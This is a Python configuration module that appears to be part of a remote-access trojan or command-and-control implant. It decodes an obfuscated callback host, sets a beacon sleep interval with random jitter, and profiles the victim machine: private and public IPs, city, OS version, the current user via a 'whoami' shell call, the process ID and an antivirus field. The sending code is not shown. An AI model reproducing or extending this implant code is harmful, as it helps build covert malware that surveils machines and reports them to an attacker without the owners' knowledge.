# -*- coding: utf8 -*-

from os import getpid, environ
from platform import system, win32_ver
from socket import getaddrinfo, gethostname
import requests
import Shell, StringEncode
import json
from random import randrange


class config():
    def __init__(self):
        self.Host = StringEncode.get('15')
        self.Path = "/"
        self.sleep = 1
        self.key = "null"
        self.ips = self.get_private_ips()
        self.osv = self.get_os_version()
        self.cuser = Shell.shell_exec("whoami")
        self.pid = getpid()
        ip_info = self.get_public_ip()
        self.public_ip = ip_info['ip']
        self.city = ip_info['city']
        self.pn = 'a'
        self.uid = '1'
        self.av = 'UNKNOW'

    def get_os_version(self):
        try:
            version = system() + " " + str(
                win32_ver()[0]) + " x64" if 'PROGRAMFILES(X86)' in environ else " x86"

        except:
            version = "None"
        return version

    def get_private_ips(self):
        try:
            addrs = getaddrinfo(gethostname(), None)
            ips = []
            for item in addrs:
                if str(item[4][0]).find(":") == -1:
                    ips.append(item[4][0])
            return ",".join(ips)
        except:
            return "0.0.0.0"

    def get_public_ip(self):
        try:
            result = requests.get('http://pv.sohu.com/cityjson?ie=utf-8').text.replace('var returnCitySN = ','').replace(';', '')
            result = json.loads(result)
            return {
                'ip': result['cip'],
                'city': result['cname']
            }
        except:
            return {
                'ip': '0.0.0.0',
                'city': '未知地区'
            }

    def get_url(self):
        return self.Host + self.Path

    def get_sleep_time(self):
        return self.sleep * (randrange(50, 200) / 100)
